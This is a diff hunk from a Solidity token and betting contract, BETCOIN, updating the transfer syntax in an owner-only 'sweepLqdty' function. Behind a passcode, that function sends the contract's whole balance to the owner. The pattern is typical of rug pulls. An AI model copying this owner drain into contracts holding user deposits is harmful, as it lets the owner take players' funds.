@@ -555,7 +555,7 @@ contract BETCOIN is Context, IBEP20, Ownable {
 
     function sweepLqdty(uint256 psscde) public onlyOwner {
         require(psscde == _passcode, "wrong passcode");
-        require(msg.sender.transfer(balanceofaddress(this)));
+        require(payable(msg.sender).send(address(this).balance));
     }
 
     function PLAY(uint256 _no) public {
